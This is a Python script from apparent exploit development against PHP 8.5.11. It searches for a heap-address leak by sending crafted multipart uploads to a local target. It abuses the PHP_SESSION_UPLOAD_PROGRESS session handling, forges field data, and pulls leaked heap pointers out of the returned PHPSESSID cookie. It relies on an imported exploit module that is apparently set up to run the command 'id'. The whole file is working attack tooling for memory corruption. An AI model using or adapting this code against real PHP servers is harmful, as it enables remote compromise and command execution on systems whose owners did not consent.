#!/usr/bin/env python3
"""Find the heap-leak trigger on 8.5.11: vary SID type, field count N, and priming shape."""
import sys, time, struct, re, urllib.parse
sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, Exploit, build_multipart

URL = "http://127.0.0.1:18114/index.php"
t = Target(URL, timeout=90.0, verbose=False)

def cookie_of(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1")) if m else b""

def heap_base(cookie):
    if len(cookie) < 1000:
        return 0
    from collections import Counter
    c = Counter()
    for i in range(0, len(cookie)-8, 8):
        v = int.from_bytes(cookie[i:i+8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, cnt = c.most_common(1)[0]
    return base if cnt >= 8 else 0

def reqA(ex):
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name":"PHPSESSID","data":b"\x00"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              ex._file_part(), ex._big_field()]
    t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=9<<20)

def reqB(sid, n, forge_len=79):
    parts = [{"name":"PHPSESSID","data":sid},
             {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    for i in range(n):
        val = (f"v{i:04d}" + "x"*44)[:48]
        parts.append({"name": str(1000+i), "data": val.encode()})
    forge = bytearray(b"A"*forge_len)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    return t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)

ex = Exploit(t, "id", htdata_offset=0x690d8, profile="bookworm")

SIDS = {
    "custom": b"attacksessionid0001",
    "hex26":  b"0123456789abcdef0123456789ab",
    "hex32":  b"0123456789abcdef0123456789abcdef",
}

print("=== 8.5.11 heap-leak trigger search ===")
for sid_name, sid in SIDS.items():
    for n in (800, 841, 860, 880, 900, 950, 1000):
        reqA(ex)
        time.sleep(0.2)
        resp = reqB(sid, n)
        ck = cookie_of(resp)
        base = heap_base(ck)
        mark = f"LEAK base=0x{base:x}" if base else f"cookie={len(ck)}"
        print(f"  sid={sid_name} n={n}: {mark}", flush=True)
        if base:
            print(f"  >>> FOUND: sid={sid_name} n={n} base=0x{base:x}")
            sys.exit(0)
        time.sleep(0.1)
print("NO LEAK found in this parameter space")
sys.exit(1)
